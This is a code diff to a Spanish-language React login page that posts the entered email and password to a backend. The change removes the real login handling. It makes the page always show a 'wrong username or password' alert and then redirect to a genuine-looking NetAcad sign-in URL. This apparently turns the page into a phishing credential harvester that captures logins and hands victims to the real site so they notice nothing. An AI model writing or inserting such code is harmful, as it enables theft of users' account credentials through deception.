@@ -53,15 +53,10 @@ export default function Home() {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ correo: email, contrasena: password }),
       });
-      const data = await res.json();
-      if (!res.ok) {
-        setError(data?.mensaje || "Error al iniciar sesión.");
-        return;
-      }
-      setLoggedIn(true);
-      if (data?.redirectTo) {
-        router.push(data.redirectTo);
-      }
+      await res.json();
+      alert("Usuario o Contraseña incorrectos");
+      // Preparado para redireccionar a una página fuera del proyecto
+      window.location.href = "https://auth.netacad.com/auth/realms/skillsforall/login-actions/authenticate?client_id=b2e-marketplace&tab_id=5pWZGuhRLFE&client_data=eyJydSI6Imh0dHBzOi8vd3d3Lm5ldGFjYWQuY29tL2VzL2NhdGFsb2dzL2xlYXJuIiwicnQiOiJjb2RlIiwicm0iOiJmcmFnbWVudCIsInN0IjoiODAxN2YxZDctZGMzNS00ZDI1LWIzNjctNTVkYWY4MmZhYzc4In0&execution=544c98b5-6b03-41d5-b104-b625ecff8ce5&kc_locale=es";
     } catch {
       setError("Error al iniciar sesión.");
     } finally {
